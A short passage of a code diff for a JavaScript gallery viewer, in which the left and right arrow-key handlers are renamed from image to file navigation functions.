         if (e.key === 'Escape') closeViewer();
-        if (e.key === 'ArrowLeft') prevImage();
-        if (e.key === 'ArrowRight') nextImage();
+        if (e.key === 'ArrowLeft') prevFile();
+        if (e.key === 'ArrowRight') nextFile();
     });
 
     loadGallery();
